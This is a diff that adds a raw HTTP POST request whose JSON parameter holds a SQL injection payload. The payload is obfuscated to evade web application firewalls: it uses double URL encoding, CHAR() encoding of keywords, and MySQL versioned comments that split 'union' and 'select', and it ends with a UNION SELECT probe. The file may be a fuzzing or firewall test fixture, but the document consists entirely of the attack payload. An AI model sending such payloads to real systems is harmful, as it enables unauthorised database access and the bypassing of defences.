@@ -1,0 +1,9 @@
+POST /settings HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/json
+Content-Length: 122
+
+{"param": "'%2520CHAR(97,110,100)%25201=0%2520u/*!42445*/nion%2520selec/*!54880*/t%25201,2,3%2520--;%2520SELECT%2520NULL"}
